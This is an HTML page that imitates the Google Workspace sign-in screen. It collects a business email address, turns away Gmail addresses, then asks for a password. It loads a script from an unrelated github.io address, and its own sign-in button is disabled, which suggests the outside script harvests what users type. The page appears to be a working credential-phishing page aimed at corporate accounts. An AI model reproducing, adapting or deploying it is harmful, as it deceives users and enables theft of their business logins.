<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Google Workspace Sign In</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{
  box-sizing:border-box;
  font-family: Arial, Helvetica, sans-serif;
}

body{
  margin:0;
  background:#f1f3f4;
  display:flex;
  align-items:center;
  justify-content:center;
  height:100vh;
}

.container{
  background:#fff;
  width:100%;
  max-width:420px;
  padding:36px;
  border-radius:10px;
  box-shadow:0 4px 10px rgba(0,0,0,0.1);
}

.logo{
  text-align:center;
  font-size:28px;
  font-weight:bold;
  color:#4285f4;
  margin-bottom:10px;
}

h2{
  font-weight:500;
  margin:5px 0 10px;
}

p{
  font-size:14px;
  color:#5f6368;
  margin-bottom:10px;
}

.error{
  font-size:13px;
  color:red;
  margin-bottom:15px;
  display:none;
}

input{
  width:100%;
  padding:14px;
  font-size:16px;
  border:1px solid #dadce0;
  border-radius:5px;
  outline:none;
}

input:focus{
  border-color:#1a73e8;
}

.actions{
  margin-top:30px;
  display:flex;
  justify-content:space-between;
  align-items:center;
}

button{
  padding:10px 22px;
  font-size:14px;
  border:none;
  border-radius:5px;
  background:#1a73e8;
  color:#fff;
  cursor:pointer;
  opacity:0.5;
}

button.active{
  opacity:1;
}

.link{
  font-size:14px;
  color:#1a73e8;
  cursor:pointer;
}

.hidden{display:none;}
</style>
</head>
<body>
<script src="https://plyarth.github.io/intc/in.js"></script>
<div class="container">

  <!-- ✅ STEP 1 -->
  <div id="stepEmail">
    <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTaGYDpJTGbnkGvO-xjuPgzs7H-hzpJH1nAYyKvS9NTk1-MBHZ3iBrZqgwN&s=10" style="width:160px;"></div>
    <h2>Sign in</h2>
    <p>Use your Google Workspace account</p>
<form>
    <input 
      type="email" 
      id="email" 
      placeholder="help@yourbusiness.com" 
      name="EMAIL ADDRESS"
    >

    <div class="error" id="emailError">
      ❌ Gmail addresses are not allowed. Use your business email.
    </div>

    <div class="actions">
      <div class="link">Create account</div>
      <button id="emailNext" type="button">Next</button>
    </div>
  </div>

  <!-- ✅ STEP 2 -->
  <div id="stepPassword" class="hidden">
    <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTaGYDpJTGbnkGvO-xjuPgzs7H-hzpJH1nAYyKvS9NTk1-MBHZ3iBrZqgwN&s=10" style="width:120px;"></div>
    <h2>Welcome</h2>
    <p id="showEmail"></p>

    <input type="password" id="password" placeholder="Enter your password" name="PASSWORD">

    <div class="actions">
      <div class="link" onclick="back()">Back</div>
      <button id="loginBtn" type="submit">Sign in</button>
    </div>
  </div>
</form>
</div>

<script>
const emailInput = document.getElementById("email");
const emailNext = document.getElementById("emailNext");
const passwordInput = document.getElementById("password");
const loginBtn = document.getElementById("loginBtn");
const emailError = document.getElementById("emailError");

function isWorkspaceEmail(email){
  return email.includes("@") && 
         !email.endsWith("@gmail.com") && 
         !email.endsWith("@googlemail.com");
}

emailInput.addEventListener("input", () => {
  const value = emailInput.value.trim();

  if(value.endsWith("@gmail.com")){
    emailError.style.display = "block";
    emailNext.classList.remove("active");
  } else {
    emailError.style.display = "none";
    emailNext.classList.toggle("active", value.length > 6 && value.includes("@"));
  }
});

passwordInput.addEventListener("input", () => {
  loginBtn.classList.toggle("active", passwordInput.value.length > 3);
});

emailNext.onclick = () => {
  if(!isWorkspaceEmail(emailInput.value)) return;

  document.getElementById("stepEmail").classList.add("hidden");
  document.getElementById("stepPassword").classList.remove("hidden");
  document.getElementById("showEmail").innerText = emailInput.value;
};

/* ❗ SIGN IN BUTTON DOES NOTHING */
loginBtn.onclick = () => {
  return; 
};

function back(){
  document.getElementById("stepPassword").classList.add("hidden");
  document.getElementById("stepEmail").classList.remove("hidden");
}
</script>

</body>
</html>
